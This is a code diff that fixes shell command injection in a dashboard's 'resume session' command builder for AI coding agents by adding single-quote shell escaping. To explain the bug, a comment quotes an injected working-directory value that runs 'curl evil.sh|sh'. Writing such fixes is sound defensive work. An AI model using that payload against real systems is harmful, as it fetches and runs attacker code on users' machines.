@@ -208,24 +208,53 @@ const dashboardData = window.dashboardData || {};
     }
 
     function toggleDailyChart() {
-    showAll = !showAll;
-    render();
-}
+        showAll = !showAll;
+        render();
+    }
 
     render();
 })();
 
 const projects = dashboardData.projects || [];
 
+// Single-quotes a value for sh.
+//
+// Every character is inert inside '...', including the double quote that the
+// old construction relied on: a double-quoted string ends at the first " in it,
+// so a working directory of
+//
+//	/x" ; curl evil.sh|sh ; "
+//
+// closed the cd argument and everything after it was a second command. The
+// only character that ends a single-quoted string is a single quote itself, and
+// the usual way out of that is to end the quote, emit an escaped quote, and
+// reopen: '\''. That is the one construction to get right here, so it is the
+// only one.
+//
+// agentCmd is not log-derived — it is the agent id, one of a fixed set the
+// scanner assigns per source — but it is quoted like the rest, because a
+// command position is exactly the wrong place to trust that.
+function shQuote(value) {
+    return "'" + String(value == null ? '' : value).replace(/'/g, "'\\''") + "'";
+}
+
+// The resume command the Copy button hands over.
+//
+// This is a command line, so it is quoted for sh rather than escaped for HTML:
+// the two are unrelated and the button vouches for the result. Note that HTML
+// escaping of the surrounding data- attribute is a second, independent
+// requirement — escapeHtml still guards the attribute this ends up in.
 function buildResumeCmd(agentCmd, cwd, sessionPath, sessionUid) {
+    const cwdArg = shQuote(cwd);
     if (agentCmd === 'claude') {
-        return 'cd "' + cwd + '" && claude --resume "' + sessionUid + '"';
+        return 'cd ' + cwdArg + ' && ' + shQuote('claude') + ' --resume ' + shQuote(sessionUid);
     } else if (agentCmd === 'codex') {
-        return 'cd "' + cwd + '" && codex --resume "' + sessionUid + '"';
+        return 'cd ' + cwdArg + ' && ' + shQuote('codex') + ' --resume ' + shQuote(sessionUid);
     } else if (agentCmd === 'agy') {
-        return 'cd "' + cwd + '" && agy --conversation "' + sessionUid + '"';
+        return 'cd ' + cwdArg + ' && ' + shQuote('agy') + ' --conversation ' + shQuote(sessionUid);
     } else {
-        return 'cd "' + cwd + '" && ' + agentCmd + ' --session "' + sessionPath + '"';
+        return 'cd ' + cwdArg + ' && ' + shQuote(agentCmd) +
+            ' --session ' + shQuote(sessionPath);
     }
 }
 
